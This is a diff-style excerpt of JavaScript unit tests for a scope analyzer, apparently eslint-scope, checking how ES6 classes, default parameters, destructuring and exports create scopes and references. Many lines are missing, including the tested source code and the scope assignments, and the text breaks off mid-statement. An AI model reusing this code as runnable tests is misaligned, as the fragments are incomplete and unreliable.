expect(scope.block.type).to.be.equal(""Program"");<\n>+        expect(scope.type).to.be.equal(""block"");<\n>+        expect(scope.block.type).to.be.equal(""BlockStatement"");<\n>+        expect(scope.type).to.be.equal(""catch"");<\n>+        expect(scope.block.type).to.be.equal(""CatchClause"");<\n>+        expect(scope.type).to.be.equal(""block"");<\n>+        expect(scope.block.type).to.be.equal(""BlockStatement"");<\n>+            ""e""<c><\n>+            ""c""<\n>+            ""e""<c><\n>+            ""a""<c><\n>+            ""b""<c><\n>+            ""c""<c><\n>+            ""c""<c><\n>+            ""d""<\n>+/* eslint-disable no-unused-expressions */<\n>+const expect = require(""chai"").expect;<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+const analyze = require("".."").analyze;<\n>+describe(""ES6 class""<c> function() {<\n>+    it(""declaration name creates class scope""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.block.type).to.be.equal(""Program"");<\n>+        expect(scope.variables[0].name).to.be.equal(""Derived"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""Base"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""Derived"");<\n>+        expect(scope.type).to.be.equal(""class"");<\n>+        expect(scope.block.type).to.be.equal(""ClassDeclaration"");<\n>+        expect(scope.variables[0].name).to.be.equal(""Derived"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.block.type).to.be.equal(""FunctionExpression"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+    it(""expression name creates class scope#1""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.block.type).to.be.equal(""Program"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""Base"");<\n>+        expect(scope.type).to.be.equal(""class"");<\n>+        expect(scope.block.type).to.be.equal(""ClassExpression"");<\n>+        expect(scope.variables[0].name).to.be.equal(""Derived"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.block.type).to.be.equal(""FunctionExpression"");<\n>+    it(""expression name creates class scope#2""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.block.type).to.be.equal(""Program"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""Base"");<\n>+        expect(scope.type).to.be.equal(""class"");<\n>+        expect(scope.block.type).to.be.equal(""ClassExpression"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.block.type).to.be.equal(""FunctionExpression"");<\n>+    it(""computed property key may refer variables""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.block.type).to.be.equal(""Program"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.block.type).to.be.equal(""FunctionExpression"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.be.equal(""yuyushiki"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""yuyushiki"");<\n>+        expect(scope.type).to.be.equal(""class"");<\n>+        expect(scope.block.type).to.be.equal(""ClassExpression"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""yuyushiki"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""yuyushiki"");<\n>+    it(""regression #49""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.block.type).to.be.equal(""Program"");<\n>+        expect(scope.variables[0].name).to.be.equal(""Shoe"");<\n>+        expect(scope.variables[1].name).to.be.equal(""shoe"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""shoe"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""Shoe"");<\n>+/* eslint-disable no-unused-expressions */<\n>+/* eslint-disable guard-for-in */<\n>+const expect = require(""chai"").expect;<\n>+const espree = require(""../third_party/espree"");<\n>+const analyze = require("".."").analyze;<\n>+describe(""ES6 default parameters:""<c> function() {<\n>+    describe(""a default parameter creates a writable reference for its initialization:""<c> function() {<\n>+            FunctionDeclaration: ""function foo(a<c> b = 0) {}""<c><\n>+            FunctionExpression: ""let foo = function(a<c> b = 0) {};""<c><\n>+            ArrowExpression: ""let foo = (a<c> b = 0) => {};""<\n>+            it(name<c> function() {<\n>+                const numVars = name === ""ArrowExpression"" ? 2 : 3;<\n>+                const ast = espree(code);<\n>+                const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+                expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>+                const scope = scopeManager.scopes[1];<\n>+                expect(scope.variables).to.have.length(numVars);  // [arguments?<c> a<c> b]<\n>+                expect(scope.references).to.have.length(1);<\n>+                const reference = scope.references[0];<\n>+                expect(reference.from).to.equal(scope);<\n>+                expect(reference.identifier.name).to.equal(""b"");<\n>+                expect(reference.resolved).to.equal(scope.variables[numVars - 1]);<\n>+                expect(reference.writeExpr).to.not.be.undefined;<\n>+                expect(reference.isWrite()).to.be.true;<\n>+                expect(reference.isRead()).to.be.false;<\n>+            });<\n>+    describe(""a default parameter creates a readable reference for references in right:""<c> function() {<\n>+            it(name<c> function() {<\n>+                const numVars = name === ""ArrowExpression"" ? 1 : 2;<\n>+                const ast = espree(code);<\n>+                const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+                expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>+                const scope = scopeManager.scopes[1];<\n>+                expect(scope.variables).to.have.length(numVars);  // [arguments?<c> b]<\n>+                expect(scope.references).to.have.length(2);  // [b<c> a]<\n>+                const reference = scope.references[1];<\n>+                expect(reference.from).to.equal(scope);<\n>+                expect(reference.identifier.name).to.equal(""a"");<\n>+                expect(reference.resolved).to.equal(scopeManager.scopes[0].variables[0]);<\n>+                expect(reference.writeExpr).to.be.undefined;<\n>+                expect(reference.isWrite()).to.be.false;<\n>+                expect(reference.isRead()).to.be.true;<\n>+            });<\n>+    describe(""a default parameter creates a readable reference for references in right (for const):""<c> function() {<\n>+            it(name<c> function() {<\n>+                const numVars = name === ""ArrowExpression"" ? 1 : 2;<\n>+                const ast = espree(code);<\n>+                const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+                expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>+                const scope = scopeManager.scopes[1];<\n>+                expect(scope.variables).to.have.length(numVars);  // [arguments?<c> b]<\n>+                expect(scope.references).to.have.length(2);  // [b<c> a]<\n>+                const reference = scope.references[1];<\n>+                expect(reference.from).to.equal(scope);<\n>+                expect(reference.identifier.name).to.equal(""a"");<\n>+                expect(reference.resolved).to.equal(scopeManager.scopes[0].variables[0]);<\n>+                expect(reference.writeExpr).to.be.undefined;<\n>+                expect(reference.isWrite()).to.be.false;<\n>+                expect(reference.isRead()).to.be.true;<\n>+            });<\n>+    describe(""a default parameter creates a readable reference for references in right (partial):""<c> function() {<\n>+            it(name<c> function() {<\n>+                const numVars = name === ""ArrowExpression"" ? 1 : 2;<\n>+                const ast = espree(code);<\n>+                const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+                expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>+                const scope = scopeManager.scopes[1];<\n>+                expect(scope.variables).to.have.length(numVars);  // [arguments?<c> b]<\n>+                expect(scope.references).to.have.length(2);  // [b<c> a]<\n>+                const reference = scope.references[1];<\n>+                expect(reference.from).to.equal(scope);<\n>+                expect(reference.identifier.name).to.equal(""a"");<\n>+                expect(reference.resolved).to.equal(scopeManager.scopes[0].variables[0]);<\n>+                expect(reference.writeExpr).to.be.undefined;<\n>+                expect(reference.isWrite()).to.be.false;<\n>+                expect(reference.isRead()).to.be.true;<\n>+            });<\n>+    describe(""a default parameter creates a readable reference for references in right's nested scope:""<c> function() {<\n>+            it(name<c> function() {<\n>+                const ast = espree(code);<\n>+                const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+                expect(scopeManager.scopes).to.have.length(3);  // [global<c> foo<c> anonymous]<\n>+                const scope = scopeManager.scopes[2];<\n>+                expect(scope.variables).to.have.length(1);  // [arguments]<\n>+                expect(scope.references).to.have.length(1);  // [a]<\n>+                const reference = scope.references[0];<\n>+                expect(reference.from).to.equal(scope);<\n>+                expect(reference.identifier.name).to.equal(""a"");<\n>+                expect(reference.resolved).to.equal(scopeManager.scopes[0].variables[0]);<\n>+                expect(reference.writeExpr).to.be.undefined;<\n>+                expect(reference.isWrite()).to.be.false;<\n>+                expect(reference.isRead()).to.be.true;<\n>+            });<\n>+/* eslint-disable no-unused-expressions */<\n>+const expect = require(""chai"").expect;<\n>+const harmony = require(""../third_party/esprima"");<\n>+const espree = require(""../third_party/espree"");<\n>+const analyze = require("".."").analyze;<\n>+describe(""ES6 destructuring assignments""<c> function() {<\n>+    it(""Pattern in var in ForInStatement""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal(""array"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.be.equal(""a"");<\n>+        expect(scope.variables[2].name).to.be.equal(""b"");<\n>+        expect(scope.variables[3].name).to.be.equal(""c"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""a"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""b"");<\n>+        expect(scope.references[2].identifier.name).to.be.equal(""c"");<\n>+        expect(scope.references[3].identifier.name).to.be.equal(""array"");<\n>+    it(""Pattern in let in ForInStatement""<c> function() {<\n>+        expect(scope.type).to.equal(""global"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal(""array"");<\n>+        expect(scope.type).to.equal(""TDZ"");<\n>+        expect(scope.variables[0].name).to.equal(""a"");<\n>+        expect(scope.variables[1].name).to.equal(""b"");<\n>+        expect(scope.variables[2].name).to.equal(""c"");<\n>+        expect(scope.references[0].identifier.name).to.equal(""array"");<\n>+        expect(scope.type).to.equal(""for"");<\n>+        expect(scope.variables[0].name).to.equal(""a"");<\n>+        expect(scope.variables[1].name).to.equal(""b"");<\n>+        expect(scope.variables[2].name).to.equal(""c"");<\n>+        expect(scope.references[0].identifier.name).to.equal(""a"");<\n>+        expect(scope.references[1].identifier.name).to.equal(""b"");<\n>+        expect(scope.references[2].identifier.name).to.equal(""c"");<\n>+    it(""Pattern with default values in var in ForInStatement""<c> function() {<\n>+        expect(scope.type).to.equal(""global"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal(""d"");<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal(""array"");<\n>+        expect(scope.type).to.equal(""function"");<\n>+        expect(scope.variables[0].name).to.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.equal(""a"");<\n>+        expect(scope.variables[2].name).to.equal(""b"");<\n>+        expect(scope.variables[3].name).to.equal(""c"");<\n>+        expect(scope.references[0].identifier.name).to.equal(""c"");<\n>+        expect(scope.references[0].writeExpr.name).to.equal(""d"");<\n>+        expect(scope.references[1].identifier.name).to.equal(""d"");<\n>+        expect(scope.references[2].identifier.name).to.equal(""a"");<\n>+        expect(scope.references[3].identifier.name).to.equal(""b"");<\n>+        expect(scope.references[4].identifier.name).to.equal(""c"");<\n>+        expect(scope.references[4].writeExpr.name).to.equal(""array"");<\n>+        expect(scope.references[5].identifier.name).to.equal(""array"");<\n>+    it(""Pattern with default values in let in ForInStatement""<c> function() {<\n>+        expect(scope.type).to.equal(""global"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal(""array"");<\n>+        expect(scope.implicit.left[0].from.type).to.equal(""TDZ"");<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal(""d"");<\n>+        expect(scope.implicit.left[1].from.type).to.equal(""for"");<\n>+        expect(scope.type).to.equal(""TDZ"");<\n>+        expect(scope.variables[0].name).to.equal(""a"");<\n>+        expect(scope.variables[1].name).to.equal(""b"");<\n>+        expect(scope.variables[2].name).to.equal(""c"");<\n>+        expect(scope.references[0].identifier.name).to.equal(""array"");<\n>+        expect(scope.type).to.equal(""for"");<\n>+        expect(scope.variables[0].name).to.equal(""a"");<\n>+        expect(scope.variables[1].name).to.equal(""b"");<\n>+        expect(scope.variables[2].name).to.equal(""c"");<\n>+        expect(scope.references[0].identifier.name).to.equal(""c"");<\n>+        expect(scope.references[0].writeExpr.name).to.equal(""d"");<\n>+        expect(scope.references[1].identifier.name).to.equal(""d"");<\n>+        expect(scope.references[2].identifier.name).to.equal(""a"");<\n>+        expect(scope.references[2].writeExpr.name).to.equal(""array"");<\n>+        expect(scope.references[3].identifier.name).to.equal(""b"");<\n>+        expect(scope.references[3].writeExpr.name).to.equal(""array"");<\n>+        expect(scope.references[4].identifier.name).to.equal(""c"");<\n>+        expect(scope.references[4].writeExpr.name).to.equal(""array"");<\n>+    it(""Pattern with nested default values in var in ForInStatement""<c> function() {<\n>+        expect(scope.type).to.equal(""global"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal(""d"");<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal(""e"");<\n>+        expect(scope.implicit.left[2].identifier.name).to.equal(""array"");<\n>+        expect(scope.type).to.equal(""function"");<\n>+        expect(scope.variables[0].name).to.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.equal(""a"");<\n>+        expect(scope.variables[2].name).to.equal(""b"");<\n>+        expect(scope.variables[3].name).to.equal(""c"");<\n>+        expect(scope.references[0].identifier.name).to.equal(""b"");<\n>+        expect(scope.references[0].writeExpr.name).to.equal(""e"");<\n>+        expect(scope.references[1].identifier.name).to.equal(""c"");<\n>+        expect(scope.references[1].writeExpr.name).to.equal(""e"");<\n>+        expect(scope.references[2].identifier.name).to.equal(""c"");<\n>+        expect(scope.references[2].writeExpr.name).to.equal(""d"");<\n>+        expect(scope.references[3].identifier.name).to.equal(""d"");<\n>+        expect(scope.references[4].identifier.name).to.equal(""e"");<\n>+        expect(scope.references[5].identifier.name).to.equal(""a"");<\n>+        expect(scope.references[5].writeExpr.name).to.equal(""array"");<\n>+        expect(scope.references[6].identifier.name).to.equal(""b"");<\n>+        expect(scope.references[6].writeExpr.name).to.equal(""array"");<\n>+        expect(scope.references[7].identifier.name).to.equal(""c"");<\n>+        expect(scope.references[7].writeExpr.name).to.equal(""array"");<\n>+        expect(scope.references[8].identifier.name).to.equal(""array"");<\n>+    it(""Pattern with nested default values in let in ForInStatement""<c> function() {<\n>+        expect(scope.type).to.equal(""global"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal(""array"");<\n>+        expect(scope.implicit.left[0].from.type).to.equal(""TDZ"");<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal(""d"");<\n>+        expect(scope.implicit.left[1].from.type).to.equal(""for"");<\n>+        expect(scope.implicit.left[2].identifier.name).to.equal(""e"");<\n>+        expect(scope.implicit.left[2].from.type).to.equal(""for"");<\n>+        expect(scope.type).to.equal(""TDZ"");<\n>+        expect(scope.variables[0].name).to.equal(""a"");<\n>+        expect(scope.variables[1].name).to.equal(""b"");<\n>+        expect(scope.variables[2].name).to.equal(""c"");<\n>+        expect(scope.references[0].identifier.name).to.equal(""array"");<\n>+        expect(scope.type).to.equal(""for"");<\n>+        expect(scope.variables[0].name).to.equal(""a"");<\n>+        expect(scope.variables[1].name).to.equal(""b"");<\n>+        expect(scope.variables[2].name).to.equal(""c"");<\n>+        expect(scope.references[0].identifier.name).to.equal(""b"");<\n>+        expect(scope.references[0].writeExpr.name).to.equal(""e"");<\n>+        expect(scope.references[1].identifier.name).to.equal(""c"");<\n>+        expect(scope.references[1].writeExpr.name).to.equal(""e"");<\n>+        expect(scope.references[2].identifier.name).to.equal(""c"");<\n>+        expect(scope.references[2].writeExpr.name).to.equal(""d"");<\n>+        expect(scope.references[3].identifier.name).to.equal(""d"");<\n>+        expect(scope.references[4].identifier.name).to.equal(""e"");<\n>+        expect(scope.references[5].identifier.name).to.equal(""a"");<\n>+        expect(scope.references[5].writeExpr.name).to.equal(""array"");<\n>+        expect(scope.references[6].identifier.name).to.equal(""b"");<\n>+        expect(scope.references[6].writeExpr.name).to.equal(""array"");<\n>+        expect(scope.references[7].identifier.name).to.equal(""c"");<\n>+        expect(scope.references[7].writeExpr.name).to.equal(""array"");<\n>+    it(""Pattern with default values in var in ForInStatement (separate declarations)""<c> function() {<\n>+        expect(scope.type).to.equal(""global"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal(""d"");<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal(""array"");<\n>+        expect(scope.type).to.equal(""function"");<\n>+        expect(scope.variables[0].name).to.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.equal(""a"");<\n>+        expect(scope.variables[2].name).to.equal(""b"");<\n>+        expect(scope.variables[3].name).to.equal(""c"");<\n>+        expect(scope.references[0].identifier.name).to.equal(""a"");<\n>+        expect(scope.references[1].identifier.name).to.equal(""b"");<\n>+        expect(scope.references[2].identifier.name).to.equal(""c"");<\n>+        expect(scope.references[2].writeExpr.name).to.equal(""d"");<\n>+        expect(scope.references[3].identifier.name).to.equal(""c"");<\n>+        expect(scope.references[3].writeExpr.name).to.equal(""array"");<\n>+        expect(scope.references[4].identifier.name).to.equal(""d"");<\n>+        expect(scope.references[5].identifier.name).to.equal(""array"");<\n>+    it(""Pattern with default values in var in ForInStatement (separate declarations and with MemberExpression)""<c> function() {<\n>+        expect(scope.type).to.equal(""global"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal(""d"");<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal(""array"");<\n>+        expect(scope.type).to.equal(""function"");<\n>+        expect(scope.variables[0].name).to.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.equal(""obj"");<\n>+        expect(scope.references[0].identifier.name).to.equal(""obj"");  // obj.a<\n>+        expect(scope.references[1].identifier.name).to.equal(""obj"");  // obj.b<\n>+        expect(scope.references[2].identifier.name).to.equal(""obj"");  // obj.c<\n>+        expect(scope.references[3].identifier.name).to.equal(""d"");<\n>+        expect(scope.references[4].identifier.name).to.equal(""array"");<\n>+    it(""ArrayPattern in var""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal(""array"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.be.equal(""a"");<\n>+        expect(scope.variables[2].name).to.be.equal(""b"");<\n>+        expect(scope.variables[3].name).to.be.equal(""c"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""a"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""b"");<\n>+        expect(scope.references[2].identifier.name).to.be.equal(""c"");<\n>+        expect(scope.references[3].identifier.name).to.be.equal(""array"");<\n>+    it(""SpreadElement in var""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal(""array"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.be.equal(""a"");<\n>+        expect(scope.variables[2].name).to.be.equal(""b"");<\n>+        expect(scope.variables[3].name).to.be.equal(""rest"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""a"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""b"");<\n>+        expect(scope.references[2].identifier.name).to.be.equal(""rest"");<\n>+        expect(scope.references[3].identifier.name).to.be.equal(""array"");<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal(""array"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+            ""arguments""<c><\n>+            ""a""<c><\n>+            ""b""<c><\n>+            ""c""<c><\n>+            ""d""<c><\n>+            ""rest""<\n>+            ""a""<c><\n>+            ""b""<c><\n>+            ""c""<c><\n>+            ""d""<c><\n>+            ""rest""<\n>+        expect(scope.references[5].identifier.name).to.be.equal(""array"");<\n>+    it(""ObjectPattern in var""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal(""object"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.be.equal(""shorthand"");<\n>+        expect(scope.variables[2].name).to.be.equal(""value"");<\n>+        expect(scope.variables[3].name).to.be.equal(""world"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""shorthand"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""value"");<\n>+        expect(scope.references[2].identifier.name).to.be.equal(""world"");<\n>+        expect(scope.references[3].identifier.name).to.be.equal(""object"");<\n>+    it(""complex pattern in var""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal(""object"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+            ""arguments""<c><\n>+            ""shorthand""<c><\n>+            ""a""<c><\n>+            ""b""<c><\n>+            ""c""<c><\n>+            ""d""<c><\n>+            ""e""<c><\n>+            ""world""<\n>+            ""shorthand""<c><\n>+            ""a""<c><\n>+            ""b""<c><\n>+            ""c""<c><\n>+            ""d""<c><\n>+            ""e""<c><\n>+            ""world""<\n>+        expect(scope.references[7].identifier.name).to.be.equal(""object"");<\n>+    it(""ArrayPattern in AssignmentExpression""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+            ""a""<c><\n>+            ""b""<c><\n>+            ""c""<c><\n>+            ""array""<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""a"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""b"");<\n>+        expect(scope.references[2].identifier.name).to.be.equal(""c"");<\n>+        expect(scope.references[3].identifier.name).to.be.equal(""array"");<\n>+    it(""ArrayPattern with MemberExpression in AssignmentExpression""<c> function() {<\n>+        expect(scope.type).to.equal(""global"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal(""array"");<\n>+        expect(scope.type).to.equal(""function"");<\n>+        expect(scope.variables[0].name).to.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.equal(""obj"");<\n>+        expect(scope.references[0].identifier.name).to.equal(""obj"");<\n>+        expect(scope.references[1].identifier.name).to.equal(""obj"");<\n>+        expect(scope.references[2].identifier.name).to.equal(""obj"");<\n>+        expect(scope.references[3].identifier.name).to.equal(""array"");<\n>+    it(""SpreadElement in AssignmentExpression""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+            ""a""<c><\n>+            ""b""<c><\n>+            ""rest""<c><\n>+            ""array""<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""a"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""b"");<\n>+        expect(scope.references[2].identifier.name).to.be.equal(""rest"");<\n>+        expect(scope.references[3].identifier.name).to.be.equal(""array"");<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+            ""a""<c><\n>+            ""b""<c><\n>+            ""c""<c><\n>+            ""d""<c><\n>+            ""rest""<c><\n>+            ""array""<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+            ""a""<c><\n>+            ""b""<c><\n>+            ""c""<c><\n>+            ""d""<c><\n>+            ""rest""<\n>+        expect(scope.references[5].identifier.name).to.be.equal(""array"");<\n>+    it(""SpreadElement with MemberExpression in AssignmentExpression""<c> function() {<\n>+        expect(scope.type).to.equal(""global"");<\n>+            ""a""<c><\n>+            ""b""<c><\n>+            ""obj""<c><\n>+            ""array""<\n>+        expect(scope.type).to.equal(""function"");<\n>+        expect(scope.variables[0].name).to.equal(""arguments"");<\n>+        expect(scope.references[0].identifier.name).to.equal(""a"");<\n>+        expect(scope.references[1].identifier.name).to.equal(""b"");<\n>+        expect(scope.references[2].identifier.name).to.equal(""obj"");<\n>+        expect(scope.references[3].identifier.name).to.equal(""array"");<\n>+    it(""ObjectPattern in AssignmentExpression""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+            ""shorthand""<c><\n>+            ""value""<c><\n>+            ""world""<c><\n>+            ""object""<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""shorthand"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""value"");<\n>+        expect(scope.references[2].identifier.name).to.be.equal(""world"");<\n>+        expect(scope.references[3].identifier.name).to.be.equal(""object"");<\n>+    it(""complex pattern in AssignmentExpression""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+            ""shorthand""<c><\n>+            ""a""<c><\n>+            ""b""<c><\n>+            ""c""<c><\n>+            ""d""<c><\n>+            ""e""<c><\n>+            ""world""<c><\n>+            ""object""<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+            ""shorthand""<c><\n>+            ""a""<c><\n>+            ""b""<c><\n>+            ""c""<c><\n>+            ""d""<c><\n>+            ""e""<c><\n>+            ""world""<\n>+        expect(scope.references[7].identifier.name).to.be.equal(""object"");<\n>+    it(""ArrayPattern in parameters""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""array"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal(""array"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.be.equal(""a"");<\n>+        expect(scope.variables[2].name).to.be.equal(""b"");<\n>+        expect(scope.variables[3].name).to.be.equal(""c"");<\n>+    it(""SpreadElement in parameters""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""array"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal(""array"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.be.equal(""a"");<\n>+        expect(scope.variables[2].name).to.be.equal(""b"");<\n>+        expect(scope.variables[3].name).to.be.equal(""rest"");<\n>+        expect(scope.variables[4].name).to.be.equal(""rest2"");<\n>+    it(""ObjectPattern in parameters""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""object"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal(""object"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.be.equal(""shorthand"");<\n>+        expect(scope.variables[2].name).to.be.equal(""value"");<\n>+        expect(scope.variables[3].name).to.be.equal(""world"");<\n>+    it(""complex pattern in parameters""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""object"");<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal(""object"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+            ""arguments""<c><\n>+            ""shorthand""<c><\n>+            ""a""<c><\n>+            ""b""<c><\n>+            ""c""<c><\n>+            ""d""<c><\n>+            ""e""<c><\n>+            ""world""<\n>+    it(""default values and patterns in var""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+            ""arguments""<c><\n>+            ""a""<c><\n>+            ""b""<c><\n>+            ""c""<c><\n>+            ""d""<\n>+            ""a""<c><\n>+            ""b""<c><\n>+            ""c""<c><\n>+            ""d""<c> // assign 20<\n>+            ""d""<c> // assign array<\n>+            ""array""<\n>+    it(""default values containing references and patterns in var""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+            ""arguments""<c><\n>+            ""a""<c><\n>+            ""b""<c><\n>+            ""c""<c><\n>+            ""d""<\n>+            ""a""<c> // assign array<\n>+            ""b""<c> // assign array<\n>+            ""c""<c> // assign array<\n>+            ""d""<c> // assign e<\n>+            ""d""<c> // assign array<\n>+            ""e""<c><\n>+            ""array""<\n>+    it(""nested default values containing references and patterns in var""<c> function() {<\n>+        expect(scope.type).to.equal(""global"");<\n>+        expect(scope.type).to.equal(""function"");<\n>+            ""arguments""<c><\n>+            ""a""<c><\n>+            ""b""<c><\n>+            ""c""<c><\n>+            ""d""<\n>+            ""a""<c> // assign array<\n>+            ""b""<c> // assign array<\n>+            ""c""<c> // assign f<\n>+            ""c""<c> // assign array<\n>+            ""d""<c> // assign f<\n>+            ""d""<c> // assign e<\n>+            ""d""<c> // assign array<\n>+            ""e""<c><\n>+            ""f""<c><\n>+            ""array""<\n>+const expect = require(""chai"").expect;<\n>+const espree = require(""../third_party/espree"");<\n>+const analyze = require("".."").analyze;<\n>+describe(""export declaration""<c> function() {<\n>+    it(""should create vairable bindings""<c> function() {<\n>+        const ast = espree(""export var v;""<c> {sourceType: ""module""});<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: ""module""});<\n>+        expect(globalScope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""module"");<\n>+        expect(scope.variables[0].name).to.be.equal(""v"");<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal(""Variable"");<\n>+    it(""should create function declaration bindings""<c> function() {<\n>+        const ast = espree(""export default function f(){};""<c> {sourceType: ""module""});<\n>+        const 